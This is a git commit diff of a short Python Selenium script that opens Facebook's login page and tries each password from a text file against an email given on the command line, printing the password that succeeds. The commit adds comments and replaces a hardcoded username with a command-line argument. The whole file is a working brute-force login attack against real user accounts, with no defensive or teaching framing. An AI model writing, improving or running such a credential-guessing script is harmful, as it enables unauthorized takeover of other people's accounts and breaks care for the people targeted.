9f24ff02171ae537cac4a55e4157ab2a2408c052
Aditiya Dwi Ramadani <69831218+aditiyadwiramadani88@users.noreply.github.com>
2021-06-24 17:07:21 +0700

    fix

--- main2.py
+++ main2.py
@@ -1,14 +1,22 @@
 from selenium import webdriver
+import sys 
 import time
+# chrome driver 
 driver =webdriver.Chrome()
+# get url 
 url = 'https://web.facebook.com'
 driver.get(url)
+# open file
 file= open("s.txt", encoding="utf-8")
 x = [l.rstrip("\n") for l in file]
+# get email input and send keys 
 elem1=driver.find_element_by_id("email")
-elem1.send_keys('adit.thok.87')
+elem1.send_keys(sys.argv[1])
+# loops text
 for i in x: 
-	    try:
+	#exceptions
+	    try:	
+		# get password and send keys   
 		    elem = driver.find_element_by_id("pass")
 		    elem3 =driver.find_element_by_xpath("//button[@name='login']")
 		    elem.send_keys(i)
@@ -17,4 +25,4 @@ for i in x:
 	    	  print(i)
 	    	  break
 	    driver.back()
-	    	
+	  
